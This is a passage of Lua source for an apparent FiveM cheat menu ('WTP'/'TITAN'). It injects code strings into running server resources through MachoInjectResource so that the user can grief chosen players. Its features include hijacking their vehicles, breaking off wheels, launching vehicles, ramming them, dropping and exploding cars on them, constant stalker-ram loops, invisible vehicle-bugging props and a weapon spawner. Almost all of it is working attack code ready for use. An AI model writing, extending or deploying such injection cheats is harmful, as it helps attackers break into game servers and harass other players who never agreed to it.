                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, driver, true, true)
                                                                WTP.SafeRunNative(SpecialFunctionDoNotUse, driver, true)
                                                                WTP.SafeRunNative(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTP.SafeRunNative(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTP.SafeRunNative(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTP.SafeRunNative(DeleteEntity, currentDriver)
                                                                end

                                                                WTP.SafeRunNative(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTP.SafeRunNative(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTP.SafeRunNative(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTP.SafeRunNative(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTP.SafeRunNative(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTP.SafeRunNative(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        for i = 0, 7 do
                                                            WTP.SafeRunNative(BreakOffVehicleWheel, vehicle, i, true, false, false, false)
                                                        end
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Launch Vehicle" then
                                        for i = 1, 2 do
                                            MachoInjectResourceRaw("monitor" or "any", string.format([[
                                                local function SafeWrap(fn)
                                                    return function(...)
                                                        return fn(...)
                                                    end
                                                end

                                                local SafeThread = SafeWrap(CreateThread)
                                                local SafePlayerPedId = SafeWrap(PlayerPedId)
                                                local SafeDoesEntityExist = SafeWrap(DoesEntityExist)
                                                local SafeGetEntityCoords = SafeWrap(GetEntityCoords)
                                                local SafeSetEntityVisible = SafeWrap(SetEntityVisible)
                                                local SafeSetEntityInvincible = SafeWrap(SetEntityInvincible)
                                                local SafeSetEntityCollision = SafeWrap(SetEntityCollision)
                                                local SafeAttachEntityToEntityPhysically = SafeWrap(AttachEntityToEntityPhysically)
                                                local SafeDetachEntity = SafeWrap(DetachEntity)
                                                local SafeDeleteEntity = SafeWrap(DeleteEntity)
                                                local SafeWait = SafeWrap(Citizen.Wait)
                                                local SafeSetEntityCoords = SafeWrap(SetEntityCoords)
                                                local SafeGetHashKey = SafeWrap(GetHashKey)
                                                local SafeRequestModel = SafeWrap(RequestModel)
                                                local SafeHasModelLoaded = SafeWrap(HasModelLoaded)
                                                local SafeCVehicle = SafeWrap(CreateVehicle)
                                                local SafeGetVehiclePedIsIn = SafeWrap(GetVehiclePedIsIn)
                                                local SafeSetEntityVelocity = SafeWrap(SetEntityVelocity)
                                                local SafeSetVehicleOnGroundProperly = SafeWrap(SetVehicleOnGroundProperly)
                                                local SafeSetEntityHeading = SafeWrap(SetEntityHeading)

                                                local function loadVehicleModel(model)
                                                    local modelHash = SafeGetHashKey(model)
                                                    SafeRequestModel(modelHash)
                                                    while not SafeHasModelLoaded(modelHash) do
                                                        SafeWait(0)
                                                    end
                                                    return modelHash
                                                end

                                                SafeThread(function()
                                                    local playerPed = SafePlayerPedId()
                                                    local playerCoords = SafeGetEntityCoords(playerPed)
                                                    local targetPed = GetPlayerPed(%d)
                                                    if not SafeDoesEntityExist(targetPed) then return end

                                                    local targetVeh = SafeGetVehiclePedIsIn(targetPed, false)
                                                    if not SafeDoesEntityExist(targetVeh) then
                                                        return
                                                    end

                                                    SafeSetEntityInvincible(targetVeh, true)
                                                    SafeSetEntityCollision(targetVeh, true, true)

                                                    local rampModel = "bmx"
                                                    local rampHash = loadVehicleModel(rampModel)
                                                    local ghostVeh = SafeCVehicle(rampHash, playerCoords.x, playerCoords.y, playerCoords.z - 2.0, 0.0, true, false)
                                                    if SafeDoesEntityExist(ghostVeh) then
                                                        SafeSetEntityVisible(ghostVeh, false, 0)
                                                        SafeSetEntityInvincible(ghostVeh, true)
                                                        SafeSetEntityCollision(ghostVeh, false, false)

                                                        SafeAttachEntityToEntityPhysically(
                                                            ghostVeh,
                                                            targetVeh,
                                                            0, 0, 0,
                                                            2000.0, 1460.928, 1000.0,
                                                            10.0, 88.0, 10.0,
                                                            true, true, true, false, 0
                                                        )
                                                    end

                                                    local upwardZ = 2.0
                                                    local iterations = 25
                                                    for i = 1, iterations do
                                                        if not SafeDoesEntityExist(targetVeh) then break end
                                                        SafeSetEntityVelocity(targetVeh, 0.0, 0.0, upwardZ)
                                                        SafeWait(200)
                                                    end

                                                    SafeThread(function()
                                                        SafeWait(30000)
                                                        if SafeDoesEntityExist(targetVeh) then
                                                            SafeSetEntityInvincible(targetVeh, false)
                                                            if SafeDoesEntityExist(ghostVeh) then
                                                                SafeDetachEntity(ghostVeh, true, true)
                                                                SafeDeleteEntity(ghostVeh)
                                                            end
                                                        end
                                                    end)
                                                end)
                                            ]], player))
                                        end
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    end
                                else
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "button", label = "Vehicle Ram", desc = 'This will ram the selected player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "WTP", "There was an error while trying to ram that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTP:UpdateListMenu()
                                        return
                                    end

                                    MachoInjectResource(targetRes, string.format([[
                                        local playerId = GetPlayerFromServerId(%d)
                                        if playerId and playerId ~= -1 then
                                            local targetPed = GetPlayerPed(playerId)
                                            if DoesEntityExist(targetPed) then
                                                local targetCoords = GetEntityCoords(targetPed)
                                                local model = GetHashKey("sultan")
                                                RequestModel(model)
                                                while not HasModelLoaded(model) do
                                                    Wait(0)
                                                end
                                                local spawnCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, -15.0, 0.0)
                                                local veh = CreateVehicle(model, spawnCoords.x, spawnCoords.y, spawnCoords.z, 0.0, true, false)
                                                SetEntityVisible(veh, true, true)
                                                SetVehicleEngineOn(veh, true, true, false)
                                                SetVehicleForwardSpeed(veh, 0.0)
                                                local heading = GetHeadingFromVector_2d(targetCoords.x - spawnCoords.x,targetCoords.y - spawnCoords.y)
                                                SetEntityHeading(veh, heading)
                                                Wait(200)
                                                SetVehicleForwardSpeed(veh, 80.0)
                                                SetVehicleEnginePowerMultiplier(veh, 100.0)
                                                SetVehicleEngineTorqueMultiplier(veh, 3.0)
                                                Wait(2000)
                                                DeleteEntity(veh)
                                            end
                                        end
                                    ]], targetPlayer))
                                    self:Notify("success", "WTP", ("Vehicle ram launched at player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Spam Vehicle",
                            desc = "Spam Vehicle target random.",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    MachoInjectResource(targetRes, string.format([[
                                        local sid = %d
                                        local models = {"jugular", "sunrise1", "sultan", "neon"}
                                        
                                        Citizen.CreateThread(function()
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(sid))
                                            if not DoesEntityExist(targetPed) then return end

                                            for i = 1, 5 do
                                                local model = models[math.random(#models)]
                                                local hash = GetHashKey(model)

                                                RequestModel(hash)
                                                while not HasModelLoaded(hash) do Wait(0) end

                                                local coords = GetEntityCoords(targetPed)
                                                local velocity = GetEntityVelocity(targetPed)
                                                
                                                local pX = coords.x + (velocity.x * 0.3)
                                                local pY = coords.y + (velocity.y * 0.3)
                                                local veh = CreateVehicle(hash, pX, pY, coords.z + 40.0, 0.0, true, true)
                                                
                                                if DoesEntityExist(veh) then
                                                    SetEntityAsMissionEntity(veh, true, true)
                                                    NetworkRegisterEntityAsNetworked(veh)
                                                    SetEntityRotation(veh, -90.0, 0.0, 0.0, 2, true)
                                                    SetEntityVelocity(veh, 0.0, 0.0, -150.0)
                                                    ApplyForceToEntity(veh, 0, 0.0, 0.0, -4000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)

                                                    Citizen.CreateThread(function()
                                                        local spawnTime = GetGameTimer()
                                                        while DoesEntityExist(veh) do
                                                            Wait(50)
                                                            local speed = GetEntitySpeed(veh)
                                                            local age = GetGameTimer() - spawnTime
                                                            
                                                            if speed < 2.0 or age > 2000 then
                                                                Wait(200)
                                                                if DoesEntityExist(veh) then
                                                                    SetEntityCoords(veh, 0.0, 0.0, -100.0)
                                                                    DeleteEntity(veh)
                                                                end
                                                                break
                                                            end
                                                        end
                                                    end)
                                                end
                                                Wait(250)
                                            end
                                            SetModelAsNoLongerNeeded(hash)
                                        end)
                                    ]], targetPlayer))

                                    self:Notify("success", "WTP", "Launching 15 kinetic rounds with auto-cleanup!", 3000)
                                else
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "scrollable", label = "Glitch Vehicle", scrollType = "onEnter", value = 1, values = {"jugular", "pounder", "sunrise1", "sultan", "neon"}, desc = 'This will glitch the selected player',
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "WTP", "There was an error while trying to ram that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTP:UpdateListMenu()
                                        return
                                    end

                                    MachoInjectResource(targetRes, string.format([[
                                        local targetServerId = %d
                                        local targetPlayer = GetPlayerFromServerId(targetServerId)
                                        if targetPlayer == -1 then return end
                                        
                                        local targetPed = GetPlayerPed(targetPlayer)
                                        if not DoesEntityExist(targetPed) then return end
                                        
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local vehicleModel = joaat("%s")
                                        
                                        RequestModel(vehicleModel)
                                        while not HasModelLoaded(vehicleModel) do Wait(0) end
                                        
                                        local obj = CreateObject(vehicleModel, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                        if not DoesEntityExist(obj) then return end
                                        NetworkRegisterEntityAsNetworked(obj)
                                        local netId = VehToNet(obj)
                                        SetNetworkIdExistsOnAllMachines(netId, true)
                                        SetNetworkIdCanMigrate(netId, true)
                                        Wait(500)
                                        AttachEntityToEntity(obj, targetPed, GetPedBoneIndex(targetPed, 0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true)
                                        SetModelAsNoLongerNeeded(vehicleModel)
                                    ]], targetPlayer, value))
                                    self:Notify("success", "WTP", ("Glitch vehicle at player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Vehicle Airdrop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"jugular", "sunrise1", "sultan", "neon"},
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    MachoInjectResource(targetRes, string.format([[
                                        local sid = %d
                                        local modelName = "%s"
                                        local hash = GetHashKey(modelName)

                                        Citizen.CreateThread(function()
                                            local pIdx = GetPlayerFromServerId(sid)
                                            local targetPed = GetPlayerPed(pIdx)
                                            if not DoesEntityExist(targetPed) then return end

                                            RequestModel(hash)
                                            while not HasModelLoaded(hash) do Wait(0) end

                                            local currentPos = GetEntityCoords(targetPed)
                                            local velocity = GetEntityVelocity(targetPed)
                                            local predictX = currentPos.x + (velocity.x * 0.4)
                                            local predictY = currentPos.y + (velocity.y * 0.4)
                                            local predictZ = currentPos.z + (velocity.z * 0.4)
                                            local veh = CreateVehicle(hash, predictX, predictY, predictZ + 45.0, 0.0, true, true)
                                            
                                            if DoesEntityExist(veh) then
                                                local netId = NetworkGetNetworkIdFromEntity(veh)
                                                SetNetworkIdCanMigrate(netId, true)
                                                SetEntityAsMissionEntity(veh, true, true)
                                                NetworkRegisterEntityAsNetworked(veh)
                                                SetEntityRotation(veh, -90.0, 0.0, 0.0, 2, true)
                                                SetEntityVelocity(veh, 0.0, 0.0, -180.0) 
                                                ApplyForceToEntity(veh, 0, 0.0, 0.0, -3000.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)

                                                Citizen.CreateThread(function()
                                                    local timer = GetGameTimer()
                                                    while DoesEntityExist(veh) do
                                                        Wait(100)
                                                        local speed = GetEntitySpeed(veh)
                                                        if speed < 5.0 or (GetGameTimer() - timer) > 3000 then 
                                                            Wait(2000)
                                                            if DoesEntityExist(veh) then
                                                                DeleteEntity(veh)
                                                            end
                                                            break
                                                        end
                                                    end
                                                end)
                                            end
                                            SetModelAsNoLongerNeeded(hash)
                                        end)
                                    ]], targetPlayer, value))
                                    self:Notify("success", "WTP", ("Vehicle airdrop at player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Vehicle Kill",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "vestra", "frogger2", "maverick", "buzzard", "cargobob", "t20", "comet",
                                "zentorno", "tampa", "nightshark", "kuruma", "buffalo", "massacro",
                                "ferrari", "comet2", "issi2", "vindicator", "baller", "baller2"
                            },
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "WTP", "There was an error while trying to drop vehicle to player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTP:UpdateListMenu()
                                        return
                                    end

                                    MachoInjectResource2(0, targetRes, string.format([[
                                        Citizen.CreateThread(function()
                                            local targetId = %d
                                            local modelName = "%s"
                                            local function SpawnAndCrashAtTarget(targetId)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then
                                                    return
                                                end
                                                local targetPed = GetPlayerPed(targetPlayer)
                                                if not targetPed or targetPed == 0 then
                                                    return
                                                end
                                                local modelHash = GetHashKey(modelName)
                                                RequestModel(modelHash)
                                                local startWait = GetGameTimer()
                                                while not HasModelLoaded(modelHash) do
                                                    Citizen.Wait(10)
                                                    if GetGameTimer() - startWait > 5000 then
                                                        return
                                                    end
                                                end
                                                local headCoords = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.3)
                                                local spawnCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 10.0)
                                                local heading = GetEntityHeading(targetPed)
                                                local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                                                if veh == 0 then
                                                    SetModelAsNoLongerNeeded(modelHash)
                                                    return
                                                end
                                                SetEntityVisible(veh, false, 0)
                                                SetEntityInvincible(veh, false)
                                                SetVehicleDoorsLocked(veh, 1)
                                                SetEntityAsMissionEntity(veh, true, true)
                                                SetEntityVelocity(veh, 0.0, 0.0, -10.0)
                                                Citizen.CreateThread(function()
                                                    while true do
                                                        Citizen.Wait(100)
                                                        if IsEntityOnGround(veh) then
                                                            AddExplosion(GetEntityCoords(veh).x, GetEntityCoords(veh).y, GetEntityCoords(veh).z, 2, 10.0, true, false, 1.0)
                                                            DeleteEntity(veh)
                                                            break
                                                        end
                                                    end
                                                end)
                                                SetModelAsNoLongerNeeded(modelHash)
                                            end
                                            SpawnAndCrashAtTarget(targetId)
                                            Citizen.Wait(5000)
                                            SpawnAndCrashAtTarget(targetId)
                                        end)
                                    ]], targetPlayer, value))
                                    self:Notify("success", "WTP", ("You executed vehicle kill to player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Troll Toggles" },
                        {
                            type = "checkbox",
                            label = "Bug Player Vehicle",
                            desc = "Bug player vehicle via target.",
                            checked = false,
                            onSelect = function(checked)
                                local targetId = nil
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then
                                        targetId = tonumber(serverId)
                                        break
                                    end
                                end

                                if not targetId then
                                    self:Notify("error", "TITAN", "You must select a player to do this!", 3000)
                                    return
                                end

                                if checked then
                                    MachoInjectResource(targetSafeRes, string.format([[
                                        _G.VehBugActive = true
                                        _G.VehBugObjs = {}

                                        local targetSid = %d
                                        local model = joaat("xs_propintarena_speakers_01a")

                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end

                                        CreateThread(function()
                                            local rot = 0
                                            while _G.VehBugActive do
                                                local pId = GetPlayerFromServerId(targetSid)
                                                local targetPed = GetPlayerPed(pId)
                                                local veh = GetVehiclePedIsIn(targetPed, false)
                                                
                                                if veh ~= 0 then
                                                    if #_G.VehBugObjs < 4 then
                                                        local offsets = {
                                                            vector3(2.0, 0, 0), vector3(-2.0, 0, 0),
                                                            vector3(0, 2.0, 0), vector3(0, -2.0, 0)
                                                        }
                                                        for _, off in ipairs(offsets) do
                                                            local obj = CreateObject(model, GetEntityCoords(veh), true, true, false)
                                                            SetEntityVisible(obj, false, false)
                                                            SetEntityCollision(obj, true, true)
                                                            table.insert(_G.VehBugObjs, {ent = obj, off = off})
                                                        end
                                                    end

                                                    rot = (rot + 120) %% 360
                                                    for _, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then
                                                            local worldPos = GetOffsetFromEntityInWorldCoords(veh, data.off.x, data.off.y, 0.0)
                                                            SetEntityCoordsNoOffset(data.ent, worldPos.x, worldPos.y, worldPos.z, false, false, false)
                                                            SetEntityRotation(data.ent, rot, rot, rot, 2, true)
                                                            ApplyForceToEntity(veh, 1, 0.0, 0.0, 2.5, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                        end
                                                    end
                                                else
                                                    for i, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                                    end
                                                    _G.VehBugObjs = {}
                                                end
                                                Wait(0)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "WTP", ("Vehicle Bug to player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    MachoInjectResource(targetSafeRes, [[
                                        _G.VehBugActive = false
                                        if _G.VehBugObjs then
                                            for _, data in ipairs(_G.VehBugObjs) do
                                                if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                            end
                                        end
                                        _G.VehBugObjs = nil
                                    ]])
                                    self:Notify("info", "TITAN", "Vehicle Bug Remove", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Bug Player Vehicle V2",
                            desc = "Driver in a bouncing, uncontrollable wreck.",
                            checked = false,
                            onSelect = function(checked)
                                local targetId = nil
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then
                                        targetId = tonumber(serverId)
                                        break
                                    end
                                end

                                if not targetId then
                                    self:Notify("error", "TITAN", "You must select a player to do this!", 3000)
                                    return
                                end

                                if checked then
                                    MachoInjectResource(targetSafeRes, string.format([[
                                        _G.VehBugActive = true
                                        _G.VehBugObjs = {}

                                        local targetSid = %d
                                        local model = joaat("xs_propintarena_speakers_01a")

                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end

                                        CreateThread(function()
                                            local rot = 0
                                            while _G.VehBugActive do
                                                local pId = GetPlayerFromServerId(targetSid)
                                                local targetPed = GetPlayerPed(pId)
                                                local veh = GetVehiclePedIsIn(targetPed, false)
                                                
                                                if veh ~= 0 then
                                                    for i = 0, 7 do
                                                        if not IsVehicleTyreBurst(veh, i, true) then
                                                            SetVehicleTyreBurst(veh, i, true, 1000.0)
                                                        end
                                                    end

                                                    if #_G.VehBugObjs < 4 then
                                                        local offsets = {
                                                            vector3(2.0, 0, 0), vector3(-2.0, 0, 0),
                                                            vector3(0, 2.0, 0), vector3(0, -2.0, 0)
                                                        }
                                                        for _, off in ipairs(offsets) do
                                                            local obj = CreateObject(model, GetEntityCoords(veh), true, true, false)
                                                            SetEntityVisible(obj, false, false)
                                                            SetEntityCollision(obj, true, true)
                                                            table.insert(_G.VehBugObjs, {ent = obj, off = off})
                                                        end
                                                    end

                                                    rot = (rot + 120) %% 360
                                                    for _, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then
                                                            local worldPos = GetOffsetFromEntityInWorldCoords(veh, data.off.x, data.off.y, 0.0)
                                                            SetEntityCoordsNoOffset(data.ent, worldPos.x, worldPos.y, worldPos.z, false, false, false)
                                                            SetEntityRotation(data.ent, rot, rot, rot, 2, true)
                                                            ApplyForceToEntity(veh, 1, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                        end
                                                    end
                                                else
                                                    for i, data in ipairs(_G.VehBugObjs) do
                                                        if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                                    end
                                                    _G.VehBugObjs = {}
                                                end
                                                Wait(0)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "WTP", ("Vehicle Bug V2 to player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    MachoInjectResource(targetSafeRes, [[
                                        _G.VehBugActive = false
                                        if _G.VehBugObjs then
                                            for _, data in ipairs(_G.VehBugObjs) do
                                                if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                            end
                                        end
                                        _G.VehBugObjs = nil
                                    ]])
                                    self:Notify("info", "TITAN", "Vehicle Bug Removed", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Stalker Ram Loop",
                            checked = false,
                            desc = "One persistent vehicle that glued-rams the target constantly.",
                            onSelect = function(checked)
                                if checked then
                                    local targetPlayer = nil
                                    for serverId, isChecked in pairs(CPlayers) do
                                        if isChecked then targetPlayer = serverId break end
                                    end

                                    if targetPlayer then
                                        _G.StalkerLoopActive = true
                                        MachoInjectResource(targetRes, string.format([[
                                            local targetId = %d
                                            _G.StalkerLoopActive = true

                                            Citizen.CreateThread(function()
                                                local model = GetHashKey("sultan")
                                                RequestModel(model)
                                                while not HasModelLoaded(model) do Citizen.Wait(0) end

                                                local stalkerVeh = nil

                                                while _G.StalkerLoopActive do
                                                    Citizen.Wait(0) -- Frame-perfect loop
                                                    
                                                    local player = GetPlayerFromServerId(targetId)
                                                    if player ~= -1 then
                                                        local targetPed = GetPlayerPed(player)
                                                        
                                                        if DoesEntityExist(targetPed) then
                                                            if not stalkerVeh or not DoesEntityExist(stalkerVeh) then
                                                                local spawnPos = GetEntityCoords(targetPed)
                                                                stalkerVeh = CreateVehicle(model, spawnPos.x, spawnPos.y, spawnPos.z - 5.0, 0.0, true, true)
                                                                NetworkRegisterEntityAsNetworked(stalkerVeh)
                                                                local netId1 = NetworkGetNetworkIdFromEntity(stalkerVeh)
                                                                SetNetworkIdCanMigrate(netId1, false)
                                                                NetworkSetEntityVisibleToNetwork(stalkerVeh, true)
                                                                SetEntityInvincible(stalkerVeh, true)
                                                                SetEntityAlpha(stalkerVeh, 200, false)
                                                            end

                                                            local playerPos = GetEntityCoords(targetPed)
                                                            local behindPos = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, -1.0, 0.1)
                                                            
                                                            local dist = #(playerPos - GetEntityCoords(stalkerVeh))
                                                            if dist > 2.0 then
                                                                SetEntityCoordsNoOffset(stalkerVeh, behindPos.x, behindPos.y, behindPos.z, false, false, false)
                                                                SetEntityHeading(stalkerVeh, GetEntityHeading(targetPed))
                                                            end

                                                            NetworkRequestControlOfEntity(stalkerVeh)
                                                            SetVehicleForwardSpeed(stalkerVeh, 150.0) 
                                                        else
                                                            _G.StalkerLoopActive = false
                                                        end
                                                    else
                                                        Citizen.Wait(500)
                                                    end
                                                end

                                                if DoesEntityExist(stalkerVeh) then DeleteEntity(stalkerVeh) end
                                            end)
                                        ]], targetPlayer))

                                        self:Notify("success", "WTP", "Stalker Ram Loop Started!", 3000)
                                    else
                                        self:Notify("error", "WTP", "Select a player first!", 3000)
                                    end
                                else
                                    MachoInjectResource(targetRes, "_G.StalkerLoopActive = false")
                                    self:Notify("info", "WTP", "Stalker Ram Loop Stopped", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Black Hole",
                            checked = false,
                            desc = 'Attracts all nearby vehicles to the selected player.',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, isChecked in pairs(CPlayers) do
                                    if isChecked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if checked and not targetPlayer then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return false
                                end

                                self:ToggleBlackHole(checked, targetPlayer)
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "ph-bold ph-rocket-launch",
            label = "Weapon Options",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "button", label = "Give Weapon",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "WEAPON_", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedWeapon(val)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Clear Weapons",
                            onSelect = function()
                                executeCode('any', [[
                                    local selfPed = PlayerPedId()
                                    WTP.SafeRunNative(RemoveAllPedWeapons, selfPed, true)
                                    WTP.SafeRunNative(GiveWeaponToPed, selfPed, 'weapon_unarmed', false, true)
                                ]])
                            end
                        },
                        { type = "divider", label = "All Weapons" },
                        { type = "scrollable", label = "Melee", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle", "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete", "weapon_switchblade", "weapon_nightstick", "weapon_wrench" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Handguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol", "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol", "weapon_vintagepistol", "weapon_flaregun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "SMGs", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg", "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Rifles", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle", "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine", "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle", "weapon_bullpuprifle_mk2", "weapon_marksmanrifle" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
